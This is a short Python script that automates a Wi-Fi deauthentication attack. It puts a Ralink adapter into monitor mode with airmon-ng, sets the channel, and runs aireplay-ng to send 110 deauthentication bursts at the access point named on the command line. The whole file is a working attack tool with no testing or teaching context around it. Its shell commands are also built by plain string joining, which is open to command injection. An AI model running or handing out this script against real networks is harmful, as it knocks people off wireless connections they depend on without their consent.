import subprocess
import sys
import time


def get_interface():  # Sets the Ralink wireless adapter in moditor mode using airmon-ng
    get_adapter = """airmon-ng | awk '{ if ($4 == "Ralink") print $2 }' """
    p = subprocess.Popen(get_adapter, stdout=subprocess.PIPE, shell=True)
    (output, err) = p.communicate()
    interface = output.decode('utf-8').replace('\n', '')
    print(interface)

    set_monitor = "airmon-ng start " + interface
    p = subprocess.Popen(set_monitor, stdin=subprocess.PIPE, shell=True)
    p.communicate(input=b'y')
    time.sleep(2)

    get_monitor_interface = """airmon-ng | awk '{ if ($4 == "Ralink") print $2 }' """
    p = subprocess.Popen(get_monitor_interface, stdout=subprocess.PIPE, shell=True)
    (output, err) = p.communicate()
    interface = output.decode('utf-8').replace('\n', '')
    return interface


interface = get_interface()

command = "iwconfig " + interface + " channel " + sys.argv[2]
subprocess.Popen(command.split(), stdout=subprocess.PIPE)
command = "aireplay-ng -0 110 -a " + sys.argv[1] + " " + interface
subprocess.Popen(command.split(), stdout=subprocess.PIPE)
